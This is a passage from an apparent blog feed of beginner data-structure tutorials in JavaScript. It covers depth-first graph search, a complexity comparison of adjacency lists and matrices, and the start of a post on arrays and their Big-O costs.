<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">bfsFromFirst = graph.bfs(first);</span><br><span class="line"></span><br><span class="line">bfsFromFirst.next().value.value; <span class="comment">// 1</span></span><br><span class="line">bfsFromFirst.next().value.value; <span class="comment">// 2</span></span><br><span class="line">bfsFromFirst.next().value.value; <span class="comment">// 3</span></span><br><span class="line">bfsFromFirst.next().value.value; <span class="comment">// 4</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>You can find more examples of usage in the <a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/graphs/graph.spec.js" target="_blank" rel="noopener">test cases</a>. Let‚Äôs move on to the DFS!</p>
<h1 id="Depth-first-search-DFS-Graph-search">Depth-first search (DFS)  - Graph search<a href="#Depth-first-search-DFS-Graph-search" class="headerlink" title="Depth-first search (DFS)  - Graph search"></a></h1><p>Depth-first search is another way to navigate a graph from an initial vertex by recursively the first adjacent node of each vertex found.</p>
<img src="https://upload.wikimedia.org/wikipedia/commons/7/7f/Depth-First-Search.gif" title="Depth First Search in a graph">
<p>The iterative implementation of a DFS is identical to the BFS, but instead of using a <code>Queue</code> you use a <code>Stack</code>:</p>
<figure class="highlight js"><figcaption><span>Graph.dfs</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/graphs/graph.js" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*dfs(first) &#123;</span><br><span class="line">  <span class="keyword">const</span> visited = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line marked">  <span class="keyword">const</span> visitList = <span class="keyword">new</span> Stack();</span><br><span class="line"></span><br><span class="line">  visitList.add(first);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(!visitList.isEmpty()) &#123;</span><br><span class="line">    <span class="keyword">const</span> node = visitList.remove();</span><br><span class="line">    <span class="keyword">if</span>(node &amp;&amp; !visited.has(node)) &#123;</span><br><span class="line">      <span class="keyword">yield</span> node;</span><br><span class="line">      visited.set(node);</span><br><span class="line">      node.getAdjacents().forEach(<span class="function"><span class="params">adj</span> =&gt;</span> visitList.add(adj));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We can test our graph as follow.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> graph = <span class="keyword">new</span> Graph(Graph.UNDIRECTED);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [first] = graph.addEdge(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">graph.addEdge(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">graph.addEdge(<span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">graph.addEdge(<span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line">graph.addEdge(<span class="number">6</span>, <span class="number">3</span>);</span><br><span class="line">graph.addEdge(<span class="number">7</span>, <span class="number">3</span>);</span><br><span class="line">graph.addEdge(<span class="number">8</span>, <span class="number">4</span>);</span><br><span class="line">graph.addEdge(<span class="number">9</span>, <span class="number">5</span>);</span><br><span class="line">graph.addEdge(<span class="number">10</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">dfsFromFirst = graph.dfs(first);</span><br><span class="line">visitedOrder = <span class="built_in">Array</span>.from(dfsFromFirst);</span><br><span class="line"><span class="keyword">const</span> values = visitedOrder.map(<span class="function"><span class="params">node</span> =&gt;</span> node.value);</span><br><span class="line"><span class="built_in">console</span>.log(values); <span class="comment">// [1, 4, 8, 3, 7, 6, 10, 2, 5, 9]</span></span><br></pre></td></tr></table></figure>
<p>As you can see the graph is the same on BFS and DFS, however, the order how the nodes were visited is very different. BFS went from 1 to 10 in that order, while DFS went as deep as it could on each node.</p>
<!--Let's see some applications were DFS and BFS can be useful.

## Find the path in a Graph

Let's say you are exploring your social network and you want to know who can introduce you to Mark Zuckerberg.

{ img /images/you-mark-connections-graph2.png "Friends graph between you and Mark Zuckerberg" %}

You code use a DFS or BFS and iterate until you find the vertex you are looking for (e.g., Mark). That will only tell us if two vertices are **connected**. Let's start with that

{ codeblock Graph.areConnected lang:js mark:6 https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/graphs/graph.js Full Code }
  areConnected(source, destination) {
    const sourceNode = this.nodes.get(source);
    const destinationNode = this.nodes.get(destination);

    if(sourceNode && destinationNode) {
      const bfsFromFirst = this.bfs(sourceNode);
      for (const node of bfsFromFirst) {
        if(node === destinationNode) {
          return true;
        }
      }
    }

    return false;
  }
{ endcodeblock }

With this function, we get if two nodes are connected or not. However, they don't give us a path.-->
<h1 id="Graph-Time-and-Space-Complexity">Graph Time and Space Complexity<a href="#Graph-Time-and-Space-Complexity" class="headerlink" title="Graph Time and Space Complexity"></a></h1><p>We have seen some of the basic operations of a Graph. How to add and remove vertices and edges. Here‚Äôs a summary of what we have covered so far:</p>
<!-- Implementation | Space | addVertex | removeVertex | addEdge | removeEdge | getAdjacents | areConnected -->
<!-- - | - | - | - | - | - | - | - &#124; -->
<!-- Adjacency List | -->
<table>
<thead>
<tr>
<th></th>
<th>Adjacency List</th>
<th>Adjacency Matrix</th>
</tr>
</thead>
<tbody>
<tr>
<td>Space</td>
<td><em><a href="#List.space">O(&#124;V&#124; + &#124;E&#124;)</a></em></td>
<td><em><a href="#Matrix.space">O(&#124;V&#124;<sup>2</sup>)</a></em></td>
</tr>
<tr>
<td><strong>add</strong>Vertex</td>
<td><em><a href="#Graph.addVertex">O(1)</a></em></td>
<td><em><a href="#Matrix.addVertex">O(&#124;V&#124;<sup>2</sup>)</a></em></td>
</tr>
<tr>
<td><strong>remove</strong>Vertex</td>
<td><em><a href="#Graph.removeVertex">O(&#124;V&#124; + &#124;E&#124;)</a></em></td>
<td><em><a href="#Matrix.addVertex">O(&#124;V&#124;<sup>2</sup>)</a></em></td>
</tr>
<tr>
<td><strong>add</strong>Edge</td>
<td><em><a href="#Graph.addEdge">O(1)</a></em></td>
<td><em><a href="#Matrix.addVertex">O(1)</a></em></td>
</tr>
<tr>
<td><strong>remove</strong>Edge (using Array)</td>
<td><em><a href="#Graph.removeEdge">O(&#124;E&#124;)</a></em></td>
<td><em><a href="#Matrix.addVertex">O(1)</a></em></td>
</tr>
<tr>
<td><strong>remove</strong>Edge (using HashSet)</td>
<td><em>O(1)</em></td>
<td><em><a href="#Matrix.addVertex">O(1)</a></em></td>
</tr>
<tr>
<td><strong>get</strong>Adjacents</td>
<td><em><a href="#Node.getAdjacents">O(&#124;E&#124;)</a></em></td>
<td><em><a href="#Matrix.getAdjacents">O(&#124;V&#124;)</a></em></td>
</tr>
<tr>
<td><strong>is</strong>Adjacent (using Array)</td>
<td><em><a href="#Node.getAdjacents">O(&#124;E&#124;)</a></em></td>
<td><em><a href="#Matrix.getAdjacents">O(1)</a></em></td>
</tr>
<tr>
<td><strong>is</strong>Adjacent (using HashSet)</td>
<td><em>O(1)</em></td>
<td><em><a href="#Matrix.getAdjacents">O(1)</a></em></td>
</tr>
</tbody>
</table>
<!-- areConnected | | -->
<p>As you can see, an adjacency list is faster in almost all functions. The only that the adjacency matrix will outperform the adjacency list is checking if a node is adjacent to other, however, if we change our implementation from Array to a HashSet we can get it in constant time as well :)</p>
<h1 id="Summary">Summary<a href="#Summary" class="headerlink" title="Summary"></a></h1><p>As we saw, Graphs can help to model many real-life scenarios such as airports, social networks, internet and so on. We covered some of most basic algorithms such as Breadth-First Search (BFS) and Depth-First Search (DFS). Also, we talk about implementations trade-offs such as adjacency list and matrix. There are many other applications that we are going to cover in another post such as finding the shortest path between nodes and different exciting graph algorithms.</p>
<!-- https://www.slideshare.net/hafsakomal/graphs-49204527 -->
<!-- https://www.slideshare.net/Abrish06/graph-48747573?next_slideshow=1 -->
<!-- http://ccicada.org/wp-content/uploads/2017/06/Community-Detection-with-Hierarchical-Clustering-Algorithms-Feb-3-2017.pdf -->
<!-- https://dreampuf.github.io/GraphvizOnline/ -->
<!-- http://www.webgraphviz.com/ -->
<!-- http://graphviz.readthedocs.io/en/stable/examples.html -->
<!-- https://www.python.org/doc/essays/graphs/ -->
<!-- Social Network Visualizations -->
<!-- http://socilab.com/#home -->
<!-- http://blog.stephenwolfram.com/2012/08/wolframalpha-personal-analytics-for-facebook/ -->
<!-- https://github.com/trekhleb/javascript-algorithms/tree/master/src/data-structures/graph -->
<!-- https://github.com/trekhleb/javascript-algorithms/tree/master/src/algorithms/graph/breadth-first-search -->
<!-- Backlinks

  https://betterdev.link/issues/54
-->
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;In this post, we are going to explore non-linear data structures like graphs. We are going to cover the central concepts and typical applications.&lt;/p&gt;
&lt;p&gt;You are probably using programs that use graphs (and trees). Let‚Äôs say for instance that you want to know the shortest path between your workplace and home you can use graph algorithms to get the answer! We are going to explore this and other fun challenges.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Data Structures and Algorithms (DSA)" scheme="https://adrianmejia.com/categories/Programming/Data-Structures-and-Algorithms-DSA/"/>
    
    
      <category term="big-o notation" scheme="https://adrianmejia.com/tags/big-o-notation/"/>
    
      <category term="algorithms" scheme="https://adrianmejia.com/tags/algorithms/"/>
    
      <category term="tutorial_algorithms" scheme="https://adrianmejia.com/tags/tutorial-algorithms/"/>
    
  </entry>
  
  <entry>
    <title>Data Structures for Beginners: Arrays, HashMaps, and Lists</title>
    <link href="https://adrianmejia.com/blog/2018/04/28/Data-Structures-Time-Complexity-for-Beginners-Arrays-HashMaps-Linked-Lists-Stacks-Queues-tutorial/"/>
    <id>https://adrianmejia.com/blog/2018/04/28/Data-Structures-Time-Complexity-for-Beginners-Arrays-HashMaps-Linked-Lists-Stacks-Queues-tutorial/</id>
    <published>2018-04-28T23:20:40.000Z</published>
    <updated>2018-04-28T23:20:40.000Z</updated>
    
    <content type="html"><![CDATA[<!-- Data Structures Time Complexity for Beginners -->
<p>When we are developing software, we have to store data in memory. Depending on how you want to manipulate the data, you might choose a data structure over another. There are many types of data types such as arrays, maps, sets, lists, trees, graphs, etc. Choosing the right data structure for a task can be tricky. So, this post will help you know the trade-offs so you can always use the right tool for the job.</p>
<a id="more"></a>
<p>On this post we are going to focus on linear data structures like Arrays, Lists, Sets, Stacks, Queues and so on.</p>
<hr>
<p>This post is part of a tutorial series:</p>
<p><strong>Learning Data Structures and Algorithms (DSA) for Beginners</strong></p>
<ol>
<li><p><a href="/blog/2018/04/04/how-you-can-change-the-world-learning-data-structures-algorithms-free-online-course-tutorial/">Intro to algorithm‚Äôs time complexity and Big O notation</a></p>
<!-- 1. Intro to Algorithm's Time Complexity and Big O Notation **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/">Eight time complexities that every programmer should know</a></p>
<!-- 1. Eight time complexities that every programmer should know **üëà you are here** -->
</li>
<li><p>Data Structures for Beginners: Arrays, HashMaps, and Lists <strong>üëà you are here</strong></p>
<!-- 1. [Data Structures for Beginners: Arrays, HashMaps, and Lists](/blog/2018/04/28/Data-Structures-Time-Complexity-for-Beginners-Arrays-HashMaps-Linked-Lists-Stacks-Queues-tutorial/) -->
</li>
<li><p><a href="/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/">Graph Data Structures for Beginners</a></p>
<!-- 1. Graph Data Structures for Beginners **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/06/11/Data-Structures-for-Beginners-Trees-binary-search-tree-tutorial/">Trees Data Structures for Beginners</a></p>
<!-- 1. Trees Data Structures for Beginners **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/07/16/self-balanced-binary-search-trees-with-avl-tree-data-structure-for-beginners/">Self-balanced Binary Search Trees</a></p>
<!-- 1. Self-balanced Binary Search Trees  **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/24/Analysis-of-Recursive-Algorithms/">Appendix I: Analysis of Recursive Algorithms</a></p>
</li>
</ol>
<hr>
<h1 id="Data-Structures-Big-O-Cheatsheet">Data Structures Big-O Cheatsheet<a href="#Data-Structures-Big-O-Cheatsheet" class="headerlink" title="Data Structures Big-O Cheatsheet"></a></h1><p>The following table is summary of everything that we are going to cover in this post.</p>
<blockquote>
<p>Bookmark it, pin it or share it, so you have it at hand when you need it.</p>
</blockquote>
<p><em>Click on the <strong>name</strong> to go the section or click on the <strong>runtime</strong> to go the implementation</em></p>
<p><code>*</code> = Amortized runtime</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Insert</th>
<th>Access</th>
<th>Search</th>
<th>Delete</th>
<th>Comments</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="#Array"><strong>Array</strong></a></td>
<td><a href="#Insert-element-on-an-array"><em>O(n)</em></a></td>
<td><a href="#Access-an-element-in-an-array"><em>O(1)</em></a></td>
<td><a href="#Search-an-element-in-an-array"><em>O(n)</em></a></td>
<td><a href="#Deleting-elements-from-an-array"><em>O(n)</em></a></td>
<td>Insertion to the end is <code>O(1)</code>. <a href="#Array-operations-time-complexity">Details here.</a></td>
</tr>
<tr>
<td><a href="#HashMaps">(Hash)<strong>Map</strong></a></td>
<td><a href="#Insert-element-on-a-HashMap-runtime">*O(1)**</a></td>
<td><a href="#Search-Access-an-element-on-a-HashMap-runtime">*O(1)**</a></td>
<td><a href="#Search-Access-an-element-on-a-HashMap-runtime">*O(1)**</a></td>
<td><a href="#Edit-Delete-element-on-a-HashMap-runtime">*O(1)**</a></td>
<td>Rehashing might affect insertion time. <a href="#HashMap-operations-time-complexity">Details here.</a></td>
</tr>
<tr>
<td><strong>Map</strong> (using Binary Search Tree)</td>
<td><em>O(log(n))</em></td>
<td>-</td>
<td><em>O(log(n))</em></td>
<td><em>O(log(n))</em></td>
<td>Implemented using Binary Search Tree</td>
</tr>
<tr>
<td><a href="#Sets"><strong>Set</strong> (using HashMap)</a></td>
<td>*<a href="#Set-Implementation">O(1)</a>**</td>
<td>-</td>
<td>*<a href="#Set-Implementation">O(1)</a>**</td>
<td>*<a href="#Set-Implementation">O(1)</a>**</td>
<td>Set using a HashMap implementation. <a href="#Set-Operations-runtime">Details here.</a></td>
</tr>
<tr>
<td><strong>Set</strong> (using list)</td>
<td><em><a href="https://www.ecma-international.org/ecma-262/6.0/#sec-set.prototype.add" target="_blank" rel="noopener">O(n)</a></em></td>
<td>-</td>
<td><em><a href="https://www.ecma-international.org/ecma-262/6.0/#sec-set.prototype.has" target="_blank" rel="noopener">O(n)</a>]</em></td>
<td><em><a href="https://www.ecma-international.org/ecma-262/6.0/#sec-set.prototype.delete" target="_blank" rel="noopener">O(n)</a></em></td>
<td>Implemented using Binary Search Tree</td>
</tr>
<tr>
<td><strong>Set</strong> (using Binary Search Tree)</td>
<td><em>O(log(n))</em></td>
<td>-</td>
<td><em>O(log(n))</em></td>
<td><em>O(log(n))</em></td>
<td>Implemented using Binary Search Tree</td>
</tr>
<tr>
<td><a href="#Singly-Linked-Lists"><strong>Linked List</strong> (singly)</a></td>
<td><em><a href="#SinglyLinkedList.addLast">O(n)</a></em></td>
<td>-</td>
<td><em><a href="#LinkedList.contains">O(n)</a></em></td>
<td><em><a href="#LinkedList.remove">O(n)</a></em></td>
<td>Adding/Removing to the start of the list is <em><code>O(1)</code></em>. <a href="#Singly-Linked-Lists-time-complexity">Details here</a>.</td>
</tr>
<tr>
<td><a href="#Doubly-Linked-Lists"><strong>Linked List</strong> (doubly)</a></td>
<td><em><a href="#DoublyLinkedList.add">O(n)</a></em></td>
<td>-</td>
<td><em><a href="#LinkedList.contains">O(n)</a></em></td>
<td><em><a href="#LinkedList.remove">O(n)</a></em></td>
<td>Adding/Deleting from the beginning/end is <em><code>O(1)</code></em>. But, deleting/adding from the middle is <em><code>O(n)</code></em>. <a href="#Doubly-Linked-Lists-time-complexity">Details here</a></td>
</tr>
<tr>
<td><a href="#Stacks"><strong>Stack</strong> (array implementation)</a></td>
<td><em><a href="#Stacks">O(1)</a></em></td>
<td>-</td>
<td>-</td>
<td><em><a href="#Stacks">O(1)</a></em></td>
<td>Insert/delete is last-in, first-out (LIFO)</td>
</tr>
<tr>
<td><a href="#QueueNaiveImpl"><strong>Queue</strong> (naive array impl.)</a></td>
<td><em><a href="#QueueNaiveImpl">O(n)</a></em></td>
<td>-</td>
<td>-</td>
<td><em><a href="#QueueNaiveImpl">O(1)</a></em></td>
<td>Insert (<code>Array.shift</code>) is <em>O(n)</em></td>
</tr>
<tr>
<td><a href="#QueueArrayImpl"><strong>Queue</strong> (array implementation)</a></td>
<td>*<a href="#QueueArrayImpl">O(1)</a>**</td>
<td>-</td>
<td>-</td>
<td><em><a href="#QueueArrayImpl">O(1)</a></em></td>
<td>Worst time insert is <em>O(n)</em>. However amortized is <em>O(1)</em></td>
</tr>
<tr>
<td><a href="#QueueListImpl"><strong>Queue</strong> (list implementation)</a></td>
<td><em><a href="#QueueListImpl">O(1)</a></em></td>
<td>-</td>
<td>-</td>
<td><em><a href="#QueueListImpl">O(1)</a></em></td>
<td>Using Doubly Linked List with reference to the last element.</td>
</tr>
</tbody>
</table>
<p>Note: <strong>Binary search trees</strong> and trees in general will be cover in the next post. Also, graph data structures.</p>
<h1 id="Primitive-Data-Types">Primitive Data Types<a href="#Primitive-Data-Types" class="headerlink" title="Primitive Data Types"></a></h1><p>Primitive data types are the most basic elements where all the other data structures built upon.  Some primitives are:</p>
<ul>
<li>Integers. E.g., <code>1</code>, <code>2</code>, <code>3</code>, ‚Ä¶</li>
<li>Characters. E.g., <code>a</code>, <code>b</code>, <code>&quot;1&quot;</code>, <code>&quot;*&quot;</code></li>
<li>Booleans. E.g., <code>true</code> or <code>false</code>.</li>
<li>Float (floating points) or doubles. E.g., <code>3.14159</code>, <code>1483e-2</code>.</li>
</ul>
<h1 id="Array">Array<a href="#Array" class="headerlink" title="Array"></a></h1><p>Arrays are collections of zero or more elements. Arrays are one of the most used data structure because of its simplicity and fast way of retrieving information.</p>
<p>You can think of an array as a drawer where you can store things on the bins.</p>
<p><strong>Array is like a drawer that stores things on bins</strong>
<img src="/images/array-drawer.jpg" title="Array is like a drawer that stores things on bins"></p>
<p>When you want to search for something you can go directly to the bin number (<em><code>O(1)</code></em>). However, if you forgot what cabinet had what data, then you will have to open one by one (<em><code>O(n)</code></em>) to verify its content until you find what you are looking for. That same happens with an array.</p>
<!-- http://apprize.info/javascript/20lessons/20lessons.files/image052.jpg -->
<!-- https://cdn2.iconfinder.com/data/icons/furniture-12/48/drawer-cabinet-closet-shelf-cabin-cupboard-furntiure-512.png -->
<p>Depending on the programming language, arrays have some differences. For some dynamic languages like JavaScript and Ruby, an array can contain different data types: numbers, strings, words, objects and even functions. In typed languages like Java/C/C++, you have to define the size of the array before using it and the data type of the collection. JavaScript would increase the size of the array automatically when it needs to.</p>
<h2 id="Arrays-built-in-operations">Arrays built-in operations<a href="#Arrays-built-in-operations" class="headerlink" title="Arrays built-in operations"></a></h2><p>Depending on the programming language, the implementation would be slightly different.</p>
<p>For instance, in JavaScript, we can accomplish append to end with <code>push</code> and append to the beginning with <code>unshift</code>. But also, we have <code>pop</code> and <code>shift</code> to remove from an array. Let‚Äôs describe some commong array operations that we are going to use through this post.</p>
<p><strong>Common JS Array built-in functions</strong></p>
<table>
<thead>
<tr>
<th>Function</th>
<th>Runtime</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>[array.<strong>push</strong>(element1<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/push" target="_blank" rel="noopener">, ‚Ä¶[, elementN]])</a></td>
<td><em>O(1)</em></td>
<td>Insert element to the end of the array</td>
</tr>
<tr>
<td><a href="http://devdocs.io/javascript/global_objects/array/pop" target="_blank" rel="noopener">array.<strong>pop</strong>()</a></td>
<td><em>O(1)</em></td>
<td>Remove element to the end of the array</td>
</tr>
<tr>
<td><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/shift" target="_blank" rel="noopener">array.<strong>shift</strong>()</a></td>
<td><em>O(n)</em></td>
<td>Remove element to the beginning of the array</td>
</tr>
<tr>
<td>[array.<strong>unshift</strong>(element1<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/unshift" target="_blank" rel="noopener">, ‚Ä¶[, elementN]])</a></td>
<td><em>O(n)</em></td>
<td>Insert element(s) to the beginning of the array</td>
</tr>
<tr>
<td>[array.<strong>slice</strong>(<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/slice" target="_blank" rel="noopener">beginning[, end]])</a></td>
<td><em>O(n)</em></td>
<td>Returns a copy of the array from <code>beginning</code> to <code>end</code>.</td>
</tr>
<tr>
<td>[array.<strong>splice</strong>(start[, deleteCount<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/splice" target="_blank" rel="noopener">, item1[,‚Ä¶]]])</a></td>
<td><em>O(n)</em></td>
<td>Changes (add/remove) the array</td>
</tr>
</tbody>
</table>
<h2 id="Insert-element-on-an-array">Insert element on an array<a href="#Insert-element-on-an-array" class="headerlink" title="Insert element on an array"></a></h2><!-- https://stackoverflow.com/a/22615787/684957 -->
<!-- https://tc39.github.io/ecma262/#sec-array.prototype.push -->
<!-- https://github.com/v8/v8/blob/master/src/js/array.js -->
<!-- https://github.com/v8/v8/blob/master/src/builtins/builtins-array.cc#L145 -->
<!-- https://tc39.github.io/ecma262/#sec-array.prototype.unshift -->
<p>There are multiple ways to insert elements into an array. You can append a new data to end, or you can add it to the beginning of the collection.</p>
<p>Let‚Äôs start with append to tail:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertToTail</span>(<span class="params">array, element</span>) </span>&#123;</span><br><span class="line">  array.push(element);</span><br><span class="line">  <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(insertToTail(array, <span class="number">4</span>)); <span class="comment">// =&gt; [ 1, 2, 3, 4 ]</span></span><br></pre></td></tr></table></figure>
<p>Based on the <a href="https://tc39.github.io/ecma262/#sec-array.prototype.push" target="_blank" rel="noopener">language specification</a>, push just set the new value at the end of the array. Thus,</p>
<blockquote>
<p>The <code>Array.push</code> runtime is a <em>O(1)</em></p>
</blockquote>
<p>Let‚Äôs now try appeding to head:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertToHead</span>(<span class="params">array, element</span>) </span>&#123;</span><br><span class="line">  array.unshift(element);</span><br><span class="line">  <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(insertToHead(array, <span class="number">0</span>)); <span class="comment">// =&gt; [ 0, 1, 2, 3, ]</span></span><br></pre></td></tr></table></figure>
<p>What do you think is the runtime of the <code>insertToHead</code> function? Looks the same as the previous one except that we are using <code>unshift</code> instead of <code>push</code>. But, there‚Äôs a catch! <a href="https://tc39.github.io/ecma262/#sec-array.prototype.unshift" target="_blank" rel="noopener">unshift algorithm</a> makes room for the new element by moving all existing ones to the next position in the array. So, it will iterate through all the elements.</p>
<blockquote>
<p>The <code>Array.unshift</code> runtime is a <em>O(n)</em></p>
</blockquote>
<h2 id="Access-an-element-in-an-array">Access an element in an array<a href="#Access-an-element-in-an-array" class="headerlink" title="Access an element in an array"></a></h2><p>If you know the index for the element that you are looking for, then you can access the element directly like this:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">access</span>(<span class="params">array, index</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> array[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>, <span class="string">'word'</span>, <span class="number">3.14</span>, &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;];</span><br><span class="line">access(array, <span class="number">0</span>); <span class="comment">// =&gt; 1</span></span><br><span class="line">access(array, <span class="number">3</span>); <span class="comment">// =&gt; &#123;a: 1&#125;</span></span><br></pre></td></tr></table></figure>
<p>As you can see in the code above, accessing an element on an array has a constant time:</p>
<blockquote>
<p>Array access runtime is  <em>O(1)</em></p>
</blockquote>
<p><em>Note: You can also change any value at a given index in constant time.</em></p>
<h2 id="Search-an-element-in-an-array">Search an element in an array<a href="#Search-an-element-in-an-array" class="headerlink" title="Search an element in an array"></a></h2><p>If you don‚Äôt know the index of the data that you want from an array. Then you have to iterate through each element on the array until we find what we are looking for.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params">array, element</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; array.length; index++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(element === array[index]) &#123;</span><br><span class="line">      <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>, <span class="string">'word'</span>, <span class="number">3.14</span>, &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;];</span><br><span class="line"><span class="built_in">console</span>.log(search(array, <span class="string">'word'</span>)); <span class="comment">// =&gt; 1</span></span><br><span class="line"><span class="built_in">console</span>.log(search(array, <span class="number">3.14</span>)); <span class="comment">// =&gt; 2</span></span><br></pre></td></tr></table></figure>
<p>Given the for-loop, we have:</p>
<blockquote>
<p>Array search runtime is <em>O(n)</em></p>
</blockquote>
<h2 id="Deleting-elements-from-an-array">Deleting elements from an array<a href="#Deleting-elements-from-an-array" class="headerlink" title="Deleting elements from an array"></a></h2><p>What do you think is the running time of deleting an element from an array?</p>
<p>Well, let‚Äôs think about the different cases:</p>
<ol>
<li>You can delete from the end of the array which might be constant time. <em>O(1)</em></li>
<li>However, you can also remove from the beginning or middle of the collection. In that case, you would have to move all the following elements to close the gap. <em>O(n)</em></li>
</ol>
<p>Talk is cheap, let‚Äôs do the code!</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params">array, element</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> index = search(array, element);</span><br><span class="line">  array.splice(index, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> array1 = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(remove(array1, <span class="number">1</span>)); <span class="comment">// =&gt; [ 0, 2, 3 ]</span></span><br></pre></td></tr></table></figure>
<p>So we are using our <code>search</code> function to find the elements‚Äô index <em>O(n)</em>. Then we use the <a href="https://tc39.github.io/ecma262/#sec-array.prototype.splice" target="_blank" rel="noopener">JS built-in <code>splice</code></a> function which has a running time of <em>O(n)</em>. What‚Äôs the total <em>O(2n)</em>? Remember we constants doesn‚Äôt matter as much.</p>
<p>We take the worst case scenario:</p>
<blockquote>
<p>Deleting an item from an array is <em>O(n)</em>.</p>
</blockquote>
<h2 id="Array-operations-time-complexity">Array operations time complexity<a href="#Array-operations-time-complexity" class="headerlink" title="Array operations time complexity"></a></h2><p>We can sum up the arrays time complexity as follows:</p>
<p><strong>Array Time Complexities</strong></p>
<table>
<thead>
<tr>
<th>Operation</th>
